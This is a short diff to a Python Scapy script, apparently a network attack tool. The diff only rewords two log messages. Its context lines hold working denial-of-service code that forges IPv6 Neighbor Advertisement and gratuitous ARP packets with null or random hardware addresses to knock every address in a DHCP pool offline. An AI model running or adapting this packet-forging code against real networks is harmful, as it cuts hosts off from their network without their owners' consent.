@@ -276,7 +276,7 @@ def garp():
             LL_ScopeALL_Multicast_Address="ff02::1"
             arpp = Ether(src=m,dst="33:33:00:00:00:01")/IPv6(src=ip,dst=LL_ScopeALL_Multicast_Address)/ICMPv6ND_NA(tgt=ip,R=0)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")
             sendPacket(arpp)
-            print "[===>] v6_ICMP_NeighborDiscovery - knock offline  %s"%ip
+            print "[ ==>] v6_ICMP_NeighborDiscovery - knock offline  %s"%ip
             if conf.verb: print "%r"%arpp
     else:
         pool=Net(dhcpsip+"/"+calcCIDR(subnet))
@@ -284,7 +284,7 @@ def garp():
             m=randomMAC()
             arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
             sendPacket(arpp)
-            print "Knocking %s offline, goodbye"%ip
+            print "[ ==>] Gratious_ARP - knock offline %s"%ip
             if conf.verb: print "%r"%arpp
 
 #
